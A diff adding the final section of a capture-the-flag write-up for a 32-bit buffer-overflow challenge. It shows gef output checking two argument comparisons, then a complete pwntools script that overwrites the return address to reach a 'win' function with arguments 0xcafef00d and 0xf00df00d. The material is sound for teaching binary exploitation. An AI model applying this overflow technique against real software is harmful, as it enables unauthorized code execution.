@@ -121,3 +121,48 @@ gef➤
 And now, we must call the win function, and pass the arguments we mentioned before. To do that, we'll just send the two arguments right aftet we jump to the function.
 
 First let's run the program in debug mode with `p = gdb.debug(binary_path)`, so we can know where the actual values that 'arg1' and 'arg2' are, and their values.
+
+These 2 are the lines that compare the arguments against the values we saw before:
+```
+ →  0x804930c <win+0076>       cmp    DWORD PTR [ebp+0x8], 0xcafef00d
+    0x8049315 <win+007f>       cmp    DWORD PTR [ebp+0xc], 0xf00df00d
+```
+
+And we can check the values at [ebp+0x8] and [ebp+0xc], and they are: 
+```
+(remote) gef➤  x/x $ebp+0x8
+0xffed3404:     0xf7faf66c
+(remote) gef➤  x/x $ebp+0xc
+0xffed3408:     0xf7fafb10
+(remote) gef➤
+```
+
+We saw the values `0xf7faf66c` for arg1, and `0xf7fafb10` for arg2. We can use the same stack dump from before, and we'll find this 2 values starting at 0xffffce94 and 0xffffce98. 
+So, we know that 4 bytes after the return address, are stored arg1 and arg2. 
+
+Now we can build out final exploit with the complete payload like this:
+
+```
+#!/usr/bin/env python3
+from pwn import *
+
+#context.arch = 'amd64'
+binary_path = '/tmp/here/vuln'
+p = process(binary_path)
+#p = gdb.debug(binary_path)
+offset = 112
+
+payload = b'A' * offset
+payload += p32(0x8049296)
+payload += b'A' * 4
+payload += p32(0xcafef00d)
+payload += p32(0xf00df00d)
+
+p.sendline(payload)
+response = p.recvall()
+print(response.decode('latin-1'))
+```
+
+That's it for this challenge! If we do this against the remote connection, we'll get the flag! 
+
+
